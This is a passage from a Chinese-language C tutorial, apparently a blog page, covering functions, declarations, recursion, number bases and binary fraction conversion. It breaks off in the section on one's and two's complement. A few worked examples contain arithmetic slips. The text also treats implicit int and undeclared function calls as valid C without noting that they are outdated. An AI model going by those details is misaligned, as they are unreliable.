    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>当使用基本数据类型（char、int、float等）作为实参时，实参和形参之间只是值传递，修改形参的值并不影响到实参函数可以没有形参</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> number1, <span class="hljs-type">int</span> number2)</span> &#123; <span class="hljs-comment">//  形式参数</span>
    number1 = <span class="hljs-number">250</span>; <span class="hljs-comment">// 不会影响实参</span>
    number2 = <span class="hljs-number">222</span>;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">88</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">99</span>;
    change(a, b);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a  = %d, b = %d&quot;</span>, a, b); <span class="hljs-comment">// 输出结果: 88, 99</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<p>返回值类型注意点</p>
<ul>
<li>如果没有写返回值类型，默认是int</li>
</ul>
<pre><code class="hljs c">max(<span class="hljs-type">int</span> number1, <span class="hljs-type">int</span> number2) &#123;<span class="hljs-comment">//  形式参数</span>
    <span class="hljs-keyword">return</span> number1 &gt; number2 ? number1 : number2;
&#125;</code></pre>
<ul>
<li>函数返回值的类型和return实际返回的值类型应保持一致。如果两者不一致,则以返回值类型为准,自动进行类型转换</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">height</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">return</span> <span class="hljs-number">3.14</span>; 
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
  <span class="hljs-type">double</span> temp = height();
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lf&quot;</span>, temp);<span class="hljs-comment">// 输出结果: 3.000000</span>
&#125;</code></pre>
<ul>
<li>一个函数内部可以多次使用return语句，但是return语句后面的代码就不再被执行</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> number1, <span class="hljs-type">int</span> number2)</span> &#123;<span class="hljs-comment">//  形式参数</span>
    <span class="hljs-keyword">return</span> number1 &gt; number2 ? number1 : number2;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;执行不到&quot;</span>); <span class="hljs-comment">// 执行不到</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">250</span>; <span class="hljs-comment">// 执行不到</span>
&#125;</code></pre>
<h2 id="函数的声明">函数的声明</h2>
<ul>
<li>在C语言中，函数的定义顺序是有讲究的：
<ul>
<li>默认情况下，只有后面定义的函数才可以调用前面定义过的函数</li>
</ul>
</li>
<li>如果想把函数的定义写在main函数后面，而且main函数能正常调用这些函数，那就必须在main函数的前面进行函数的声明, 否则
<ul>
<li>系统搞不清楚有没有这个函数</li>
<li>系统搞不清楚这个函数接收几个参数</li>
<li>系统搞不清楚这个函数的返回值类型是什么</li>
</ul>
</li>
<li>所以函数声明,就是在函数调用之前告诉系统, 该函数叫什么名称, 该函数接收几个参数, 该函数的返回值类型是什么</li>
<li>函数的声明格式：
<ul>
<li>将自定义函数时{}之前的内容拷贝到调用之间即可</li>
<li>例如: <code>int max( int a, int b );</code></li>
<li>或者: <code>int max( int, int );</code></li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 函数声明</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span> &#123;
    getMax(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 调用函数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
<span class="hljs-comment">// 函数实现</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span> &#123;
    <span class="hljs-type">int</span> max = v1 &gt; v2 ? v1 : v2;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %i\n&quot;</span>, max);
&#125;</code></pre>
<ul>
<li>
<p>函数的声明与实现的关系</p>
<ul>
<li>声明仅仅代表着告诉系统一定有这个函数, 和这个函数的参数、返回值是什么</li>
<li>实现代表着告诉系统, 这个函数具体的业务逻辑是怎么运作的</li>
</ul>
</li>
<li>
<p>函数声明注意点:</p>
<ul>
<li>函数的实现不能重复, 而函数的声明可以重复</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 函数声明</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span>;
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span>;
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span>; <span class="hljs-comment">// 不会报错</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span> &#123;
    getMax(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 调用函数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
<span class="hljs-comment">// 函数实现</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span> &#123;
    <span class="hljs-type">int</span> max = v1 &gt; v2 ? v1 : v2;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %i\n&quot;</span>, max);
&#125;</code></pre>
</li>
</ul>
<p>函数声明可以写在函数外面,也可以写在函数里面, 只要在调用之前被声明即可</p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span> &#123;
    <span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span>; <span class="hljs-comment">// 函数声明, 不会报错</span>
    getMax(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 调用函数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
<span class="hljs-comment">// 函数实现</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span> &#123;
    <span class="hljs-type">int</span> max = v1 &gt; v2 ? v1 : v2;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %i\n&quot;</span>, max);
&#125;</code></pre>
<ul>
<li>当被调函数的函数定义出现在主调函数之前时,在主调函数中也可以不对被调函数再作声明</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 函数实现</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">getMax</span><span class="hljs-params">(<span class="hljs-type">int</span> v1, <span class="hljs-type">int</span> v2)</span> &#123;
    <span class="hljs-type">int</span> max = v1 &gt; v2 ? v1 : v2;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %i\n&quot;</span>, max);
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span> &#123;
    getMax(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 调用函数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>如果被调函数的返回值是整型时,可以不对被调函数作说明,而直接调用</p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span> &#123;
    <span class="hljs-type">int</span> res = getMin(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">// 不会报错</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %d\n&quot;</span>, res );
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">getMin</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<span class="hljs-comment">// 返回int, 不用声明</span>
    <span class="hljs-keyword">return</span> num1 &lt; num2 ? num1 : num2;
&#125;</code></pre>
<h2 id="main函数分析">main函数分析</h2>
<ul>
<li>main的含义:
<ul>
<li>main是函数的名称, 和我们自定义的函数名称一样, 也是一个标识符</li>
<li>只不过main这个名称比较特殊, 程序已启动就会自动调用它</li>
</ul>
</li>
<li>return 0;的含义:
<ul>
<li>告诉系统main函数是否正确的被执行了</li>
<li>如果main函数的执行正常, 那么就返回0</li>
<li>如果main函数执行不正常, 那么就返回一个非0的数</li>
</ul>
</li>
<li>返回值类型:
<ul>
<li>一个函数return后面写的是什么类型, 函数的返回值类型就必须是什么类型, 所以写int</li>
</ul>
</li>
<li>形参列表的含义
<ul>
<li>int argc :
<ul>
<li>系统在启动程序时调用main函数时传递给argv的值的个数</li>
</ul>
</li>
<li>const char * argv[] :
<ul>
<li>系统在启动程序时传入的的值, 默认情况下系统只会传入一个值, 这个值就是main函数执行文件的路径</li>
<li>也可以通过命令行或项目设置传入其它参数<br>
<img src="https://img-blog.csdnimg.cn/img_convert/b34d8b60dcd90a58a27117fc781aee60.png" alt="img"><br>
<img src="https://img-blog.csdnimg.cn/img_convert/9b18f65597759b1999145e7f23767aca.png" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>函数练习
<ul>
<li>写一个函数从键盘输入三个整型数字,找出其最大值</li>
<li>写一个函数求三个数的平均值</li>
</ul>
</li>
</ul>
<hr>
<h2 id="递归函数了解">递归函数(了解)</h2>
<ul>
<li>
<p>什么是递归函数?</p>
<ul>
<li>一个函数在它的函数体内调用它自身称为递归调用</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">function</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span>&#123;
    function(x);
&#125;</code></pre>
</li>
<li>
<p>递归函数构成条件</p>
<ul>
<li>自己搞自己</li>
<li>存在一个条件能够让递归结束</li>
<li>问题的规模能够缩小</li>
</ul>
</li>
<li>
<p>示例:</p>
<ul>
<li>获取用户输入的数字, 直到用户输入一个正数为止</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">getNumber</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">-1</span>;
    <span class="hljs-keyword">while</span> (number &lt; <span class="hljs-number">0</span>) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入一个正数\n&quot;</span>);
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);
    &#125;

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number);
&#125;</code></pre>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">getNumber2</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">-1</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入一个正数abc\n&quot;</span>);
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);
    <span class="hljs-keyword">if</span> (number &lt; <span class="hljs-number">0</span>) &#123;
<span class="hljs-comment">//        负数</span>
        getNumber2();
    &#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-comment">//        正数</span>
       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number);
    &#125;
&#125;
</code></pre>
<ul>
<li>递归和循环区别
<ul>
<li>能用循环实现的功能,用递归都可以实现</li>
<li>递归常用于&quot;回溯&quot;, “树的遍历”,&quot;图的搜索&quot;等问题</li>
<li>但代码理解难度大，内存消耗大(易导致栈溢出), 所以考虑到代码理解难度和内存消耗问题, 在企业开发中一般能用循环都不会使用递归</li>
</ul>
</li>
<li>递归练习
<ul>
<li>有5个人坐在一起,问第5个人多少岁?他说比第4个人大两岁。问 第4个人岁数,他说比第3个人大两岁。问第3个人,又说比第2个 人大两岁。问第2个人,说比第1个人大两岁。最后问第1个人, 他说是10岁。请问第5个人多大?</li>
<li>用递归法求N的阶乘</li>
<li>设计一个函数用来计算B的n次方</li>
</ul>
</li>
</ul>
<hr>
<h2 id="进制基本概念">进制基本概念</h2>
<ul>
<li>
<p>什么是进制?</p>
<ul>
<li>进制是一种计数的方式,数值的表示形式</li>
</ul>
</li>
<li>
<p>常见的进制</p>
<ul>
<li>十进制、二进制、八进制、十六进制</li>
</ul>
</li>
<li>
<p>进制书写的格式和规律</p>
<ul>
<li>
<p>十进制 0、1、2、3、4、5、6、7、8、9 逢十进一</p>
</li>
<li>
<p>二进制 0、1 逢二进一</p>
<ul>
<li>书写形式:需要以0b或者0B开头,例如: 0b101</li>
</ul>
</li>
<li>
<p>八进制 0、1、2、3、4、5、6、7 逢八进一</p>
<ul>
<li>书写形式:在前面加个0,例如: 061</li>
</ul>
</li>
<li>
<p>十六进制 0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F 逢十六进一</p>
</li>
<li>
<p>书写形式:在前面加个0x或者0X,例如: 0x45</p>
</li>
</ul>
</li>
<li>
<p>练习</p>
<ul>
<li>1.用不同进制表示如下有多少个方格</li>
<li><img src="https://img-blog.csdnimg.cn/img_convert/8e8f3a79b62f85f57be2567d6ec8b7a4.png" alt="img"></li>
<li>2.判断下列数字是否合理</li>
</ul>
<pre><code class="hljs c"><span class="hljs-number">00011</span>  <span class="hljs-number">0x001</span>  <span class="hljs-number">0x7</span>h4  <span class="hljs-number">10.98</span>  <span class="hljs-number">0986</span>  <span class="hljs-number">.089</span><span class="hljs-number">-109</span>
+<span class="hljs-number">178</span>  <span class="hljs-number">0b</span>325  <span class="hljs-number">0b0010</span>  <span class="hljs-number">0xffdc</span> <span class="hljs-number">96f</span> <span class="hljs-number">96.0f</span> <span class="hljs-number">96.</span>oF  <span class="hljs-number">-.003</span></code></pre>
</li>
</ul>
<h2 id="进制转换">进制转换</h2>
<ul>
<li>10 进制转 2 进制
<ul>
<li>除2取余, 余数倒序; 得到的序列就是二进制表示形式</li>
<li>例如: 将十进制(97) 10转换为二进制数<br>
<img src="https://img-blog.csdnimg.cn/img_convert/cb8e60ad33eb38905a5475a97e509a48.png" alt="img"></li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>
<p>2 进制转 10 进制</p>
<ul>
<li>每一位二进制进制位的值 * 2的当前索引次幂; 再将所有位求出的值相加</li>
<li>例如: 将二进制01100100转换为十进制</li>
</ul>
<pre><code class="hljs c"><span class="hljs-number">01100100</span>
索引从右至左, 从零开始
第<span class="hljs-number">0</span>位: <span class="hljs-number">0</span> * <span class="hljs-number">2</span>^<span class="hljs-number">0</span> = <span class="hljs-number">0</span>;
第<span class="hljs-number">1</span>位: <span class="hljs-number">0</span> * <span class="hljs-number">2</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span>;
第<span class="hljs-number">2</span>位: <span class="hljs-number">1</span> * <span class="hljs-number">2</span>^<span class="hljs-number">2</span> = <span class="hljs-number">4</span>;
第<span class="hljs-number">3</span>位: <span class="hljs-number">0</span> * <span class="hljs-number">2</span>^<span class="hljs-number">3</span> = <span class="hljs-number">0</span>;
第<span class="hljs-number">4</span>位: <span class="hljs-number">0</span> * <span class="hljs-number">2</span>^<span class="hljs-number">4</span> = <span class="hljs-number">0</span>;
第<span class="hljs-number">5</span>位: <span class="hljs-number">1</span> * <span class="hljs-number">2</span>^<span class="hljs-number">5</span> = <span class="hljs-number">32</span>;
第<span class="hljs-number">6</span>位: <span class="hljs-number">1</span> * <span class="hljs-number">2</span>^<span class="hljs-number">6</span> = <span class="hljs-number">64</span>;
第<span class="hljs-number">7</span>位: <span class="hljs-number">0</span> * <span class="hljs-number">2</span>^<span class="hljs-number">7</span> = <span class="hljs-number">0</span>;
最终结果为: <span class="hljs-number">0</span> + <span class="hljs-number">0</span> + <span class="hljs-number">4</span> + <span class="hljs-number">0</span> + <span class="hljs-number">0</span> + <span class="hljs-number">32</span> + <span class="hljs-number">64</span> + <span class="hljs-number">0</span> = <span class="hljs-number">100</span></code></pre>
</li>
</ul>
<p>2 进制转 8 进制</p>
<ul>
<li>三个二进制位代表一个八进制位, 因为3个二进制位的最大值是7，而八进制是逢8进1</li>
<li>例如: 将二进制01100100转换为八进制数</li>
</ul>
<pre><code class="hljs c">从右至左每<span class="hljs-number">3</span>位划分为<span class="hljs-number">8</span>进制的<span class="hljs-number">1</span>位, 不够前面补<span class="hljs-number">0</span>
<span class="hljs-number">001</span> <span class="hljs-number">100</span> <span class="hljs-number">100</span>
第<span class="hljs-number">0</span>位: <span class="hljs-number">100</span> 等于十进制 <span class="hljs-number">4</span>
第<span class="hljs-number">1</span>位: <span class="hljs-number">100</span> 等于十进制 <span class="hljs-number">4</span>
第<span class="hljs-number">2</span>位: <span class="hljs-number">001</span> 等于十进制 <span class="hljs-number">1</span>
最终结果: <span class="hljs-number">144</span>就是转换为<span class="hljs-number">8</span>进制的值</code></pre>
<p>2 进制转 16 进制</p>
<ul>
<li>四个二进制位代表一个十六进制位，因为4个二进制位的最大值是15，而十六进制是逢16进1</li>
<li>例如: 将二进制01100100转换为十六进制数</li>
</ul>
<pre><code class="hljs c">从右至左每<span class="hljs-number">4</span>位划分为<span class="hljs-number">16</span>进制的<span class="hljs-number">1</span>位, 不够前面补<span class="hljs-number">0</span>
<span class="hljs-number">0110</span> <span class="hljs-number">0100</span>
第<span class="hljs-number">0</span>位: <span class="hljs-number">0100</span> 等于十进制 <span class="hljs-number">4</span>
第<span class="hljs-number">1</span>位: <span class="hljs-number">0110</span> 等于十进制 <span class="hljs-number">6</span>
最终结果: <span class="hljs-number">64</span>就是转换为<span class="hljs-number">16</span>进制的值</code></pre>
<p>其它进制转换为十进制</p>
<ul>
<li>系数 * 基数 ^ 索引 之和</li>
</ul>
<pre><code class="hljs c"> 十进制           --&gt;          十进制
<span class="hljs-number">12345</span>   =  <span class="hljs-number">10000</span> + <span class="hljs-number">2000</span> + <span class="hljs-number">300</span> + <span class="hljs-number">40</span> + <span class="hljs-number">5</span>
        =  (<span class="hljs-number">1</span> * <span class="hljs-number">10</span> ^ <span class="hljs-number">4</span>)  + (<span class="hljs-number">2</span> * <span class="hljs-number">10</span> ^ <span class="hljs-number">3</span>) + (<span class="hljs-number">3</span> * <span class="hljs-number">10</span> ^ <span class="hljs-number">2</span>) + (<span class="hljs-number">4</span> * <span class="hljs-number">10</span> ^ <span class="hljs-number">1</span>) + (<span class="hljs-number">5</span> * <span class="hljs-number">10</span> ^ <span class="hljs-number">0</span>)
        =  (<span class="hljs-number">1</span> * <span class="hljs-number">10000</span>) + (<span class="hljs-number">2</span> + <span class="hljs-number">1000</span>) + (<span class="hljs-number">3</span> * <span class="hljs-number">100</span>) + (<span class="hljs-number">4</span> * <span class="hljs-number">10</span>) + (<span class="hljs-number">5</span> * <span class="hljs-number">1</span>)
        =  <span class="hljs-number">10000</span> + <span class="hljs-number">2000</span> + <span class="hljs-number">300</span> + <span class="hljs-number">40</span> + <span class="hljs-number">5</span>
        =  <span class="hljs-number">12345</span>

规律:
其它进制转换为十进制的结果 = 系数 * 基数 ^ 索引 之和

系数: 每一位的值就是一个系数 
基数: 从x进制转换到十进制, 那么x就是基数
索引: 从最低位以<span class="hljs-number">0</span>开始, 递增的数</code></pre>
<pre><code class="hljs c">二进制        --&gt;      十进制
<span class="hljs-number">543210</span>
<span class="hljs-number">101101</span> = (<span class="hljs-number">1</span> * <span class="hljs-number">2</span> ^ <span class="hljs-number">5</span>) + (<span class="hljs-number">0</span> * <span class="hljs-number">2</span> ^ <span class="hljs-number">4</span>) + (<span class="hljs-number">1</span> * <span class="hljs-number">2</span> ^ <span class="hljs-number">3</span>) + (<span class="hljs-number">1</span> * <span class="hljs-number">2</span> ^ <span class="hljs-number">2</span>) + (<span class="hljs-number">0</span> * <span class="hljs-number">2</span> ^ <span class="hljs-number">1</span>) + (<span class="hljs-number">1</span> * <span class="hljs-number">2</span> ^ <span class="hljs-number">0</span>)
       = <span class="hljs-number">32</span> + <span class="hljs-number">0</span> + <span class="hljs-number">8</span> + <span class="hljs-number">4</span> + <span class="hljs-number">0</span> + <span class="hljs-number">1</span>
       = <span class="hljs-number">45</span>

八进制        --&gt;     十进制
<span class="hljs-number">016</span>  =   (<span class="hljs-number">0</span> * <span class="hljs-number">8</span> ^ <span class="hljs-number">2</span>) + (<span class="hljs-number">1</span> * <span class="hljs-number">8</span> ^ <span class="hljs-number">1</span>) + (<span class="hljs-number">6</span> * <span class="hljs-number">8</span> ^ <span class="hljs-number">0</span>)
     =    <span class="hljs-number">0</span>  + <span class="hljs-number">8</span> + <span class="hljs-number">6</span>
     =    <span class="hljs-number">14</span>

十六进制      --&gt;      十进制
<span class="hljs-number">0x11f</span> =  (<span class="hljs-number">1</span> * <span class="hljs-number">16</span> ^ <span class="hljs-number">2</span>) + (<span class="hljs-number">1</span> * <span class="hljs-number">16</span> ^ <span class="hljs-number">1</span>) + (<span class="hljs-number">15</span> * <span class="hljs-number">16</span> ^ <span class="hljs-number">0</span>)
      =   <span class="hljs-number">256</span>  + <span class="hljs-number">16</span> + <span class="hljs-number">15</span>
      =   <span class="hljs-number">287</span>
</code></pre>
<p>十进制快速转换为其它进制</p>
<ul>
<li>十进制除以<code>基数</code>取余, 倒叙读取</li>
</ul>
<pre><code class="hljs c">十进制        --&gt;     二进制
<span class="hljs-number">100</span>          --&gt;    <span class="hljs-number">1100100</span>
<span class="hljs-number">100</span> / <span class="hljs-number">2</span>   = <span class="hljs-number">50</span>     <span class="hljs-number">0</span>
<span class="hljs-number">50</span>  / <span class="hljs-number">2</span>   = <span class="hljs-number">25</span>     <span class="hljs-number">0</span>
<span class="hljs-number">25</span>  / <span class="hljs-number">2</span>   = <span class="hljs-number">12</span>     <span class="hljs-number">1</span>
<span class="hljs-number">12</span>  / <span class="hljs-number">2</span>   = <span class="hljs-number">6</span>      <span class="hljs-number">0</span>
<span class="hljs-number">6</span>   / <span class="hljs-number">2</span>   = <span class="hljs-number">3</span>      <span class="hljs-number">0</span>
<span class="hljs-number">3</span>   / <span class="hljs-number">2</span>   = <span class="hljs-number">1</span>      <span class="hljs-number">1</span>
<span class="hljs-number">1</span>   / <span class="hljs-number">2</span>   = <span class="hljs-number">0</span>      <span class="hljs-number">1</span>


十进制        --&gt;     八进制
<span class="hljs-number">100</span>          --&gt;     <span class="hljs-number">144</span>
<span class="hljs-number">100</span> / <span class="hljs-number">8</span>    = <span class="hljs-number">12</span>    <span class="hljs-number">4</span>
<span class="hljs-number">12</span>  / <span class="hljs-number">8</span>    = <span class="hljs-number">1</span>     <span class="hljs-number">4</span>
<span class="hljs-number">1</span>   / <span class="hljs-number">8</span>    = <span class="hljs-number">0</span>     <span class="hljs-number">1</span>

十进制        --&gt;     十六进制
<span class="hljs-number">100</span>          --&gt; <span class="hljs-number">64</span>
<span class="hljs-number">100</span> / <span class="hljs-number">16</span>   =  <span class="hljs-number">6</span>    <span class="hljs-number">4</span>
<span class="hljs-number">6</span>   / <span class="hljs-number">16</span>   =  <span class="hljs-number">0</span>    <span class="hljs-number">6</span></code></pre>
<h2 id="十进制小数转换为二进制小数">十进制小数转换为二进制小数</h2>
<ul>
<li>整数部分,直接转换为二进制即可</li>
<li>小数部分,使用&quot;乘2取整，顺序排列&quot;
<ul>
<li>用2乘十进制小数,可以得到积,将积的整数部分取出,再用2乘余下的小数部分,直到积中的小数部分为零，或者达到所要求的精度为止</li>
<li>然后把取出的整数部分按顺序排列起来, 即是小数部分二进制</li>
</ul>
</li>
<li>最后将整数部分的二进制和小数部分的二进制合并起来, 即是一个二进制小数</li>
<li>例如: 将12.125转换为二进制</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 整数部分(除2取余)</span>
  <span class="hljs-number">12</span>
/  <span class="hljs-number">2</span>
------
   <span class="hljs-number">6</span>    <span class="hljs-comment">// 余0</span>
/  <span class="hljs-number">2</span>
------
   <span class="hljs-number">3</span>    <span class="hljs-comment">// 余0</span>
/  <span class="hljs-number">2</span>
------
   <span class="hljs-number">1</span>   <span class="hljs-comment">// 余1</span>
/  <span class="hljs-number">2</span>
------
  <span class="hljs-number">0</span>   <span class="hljs-comment">// 余1</span>
<span class="hljs-comment">//12 --&gt; 1100</span>
  
<span class="hljs-comment">// 小数部分(乘2取整数积)</span>
  <span class="hljs-number">0.125</span>
*     <span class="hljs-number">2</span>
  ------
   <span class="hljs-number">0.25</span>  <span class="hljs-comment">//0</span>
   <span class="hljs-number">0.25</span>
*     <span class="hljs-number">2</span>
  ------
    <span class="hljs-number">0.5</span>  <span class="hljs-comment">//0</span>
    <span class="hljs-number">0.5</span>
*     <span class="hljs-number">2</span>
  ------
    <span class="hljs-number">1.0</span>  <span class="hljs-comment">//1</span>
    <span class="hljs-number">0.0</span>
<span class="hljs-comment">// 0.125 --&gt; 0.001</span>

<span class="hljs-comment">// 12.8125 --&gt; 1100.001</span>
</code></pre>
<h2 id="二进制小数转换为十进制小数">二进制小数转换为十进制小数</h2>
<ul>
<li>整数部分按照二进制转十进制即可</li>
<li>小数部分从最高位开始乘以2的负n次方, n从1开始</li>
<li>例如: 将 1100.001转换为十进制</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 整数部分(乘以2的n次方, n从0开始)</span>
<span class="hljs-number">0</span> * <span class="hljs-number">2</span>^<span class="hljs-number">0</span> = <span class="hljs-number">0</span>
<span class="hljs-number">0</span> * <span class="hljs-number">2</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span>
<span class="hljs-number">1</span> * <span class="hljs-number">2</span>^<span class="hljs-number">2</span> = <span class="hljs-number">4</span>
<span class="hljs-number">1</span> * <span class="hljs-number">2</span>^<span class="hljs-number">3</span> = <span class="hljs-number">8</span>
 <span class="hljs-comment">// 1100 == 8 + 4 + 0 + 0 == 12</span>

<span class="hljs-comment">// 小数部分(乘以2的负n次方, n从0开始)</span>
<span class="hljs-number">0</span> * (<span class="hljs-number">1</span>/<span class="hljs-number">2</span>) = <span class="hljs-number">0</span>
<span class="hljs-number">0</span> * (<span class="hljs-number">1</span>/<span class="hljs-number">4</span>) = <span class="hljs-number">0</span>
<span class="hljs-number">1</span> * (<span class="hljs-number">1</span>/<span class="hljs-number">8</span>) = <span class="hljs-number">0.125</span>
<span class="hljs-comment">// .100 == 0 + 0 + 0.125 == 0.125</span>

<span class="hljs-comment">// 1100.001  --&gt; 12.125</span></code></pre>
<ul>
<li>练习:
<ul>
<li>将0.8125转换为二进制</li>
<li>将0.1101转换为十进制</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">  <span class="hljs-number">0.8125</span>
*      <span class="hljs-number">2</span>
--------
   <span class="hljs-number">1.625</span>  <span class="hljs-comment">// 1</span>
   <span class="hljs-number">0.625</span>
*      <span class="hljs-number">2</span>
--------
    <span class="hljs-number">1.25</span> <span class="hljs-comment">// 1</span>
    <span class="hljs-number">0.25</span>
*      <span class="hljs-number">2</span>
--------
     <span class="hljs-number">0.5</span> <span class="hljs-comment">// 0</span>
*      <span class="hljs-number">2</span>
--------
    <span class="hljs-number">1.0</span> <span class="hljs-comment">// 1</span>
    <span class="hljs-number">0.0</span>

<span class="hljs-comment">// 0. 8125  --&gt; 0.1101</span></code></pre>
<pre><code class="hljs c"><span class="hljs-number">1</span>*(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>) = <span class="hljs-number">0.5</span>
<span class="hljs-number">1</span>*(<span class="hljs-number">1</span>/<span class="hljs-number">4</span>)=<span class="hljs-number">0.25</span>
<span class="hljs-number">0</span>*(<span class="hljs-number">1</span>/<span class="hljs-number">8</span>)=<span class="hljs-number">0</span>
<span class="hljs-number">1</span>*(<span class="hljs-number">1</span>/<span class="hljs-number">16</span>)=<span class="hljs-number">0.0625</span>

<span class="hljs-comment">//0.1101 --&gt; 0.5 + 0.25 + 0 + 0.0625 == 0.8125</span>
</code></pre>
<h2 id="原码反码补码">原码反码补码</h2>
<ul>
<li>
<p>计算机只能识别0和1, 所以计算机中存储的数据都是以0和1的形式存储的</p>
</li>
<li>
<p>数据在计算机内部是以补码的形式储存的, 所有数据的运算都是以补码进行的</p>
</li>
<li>
<p>正数的原码、反码和补码</p>
<ul>
<li>正数的原码、反码和补码都是它的二进制</li>
<li>例如: 12的原码、反码和补码分别为
<ul>
<li><code>0000 0000 0000 0000 0000 0000 0000 1100</code></li>
<li><code>0000 0000 0000 0000 0000 0000 0000 1100</code></li>
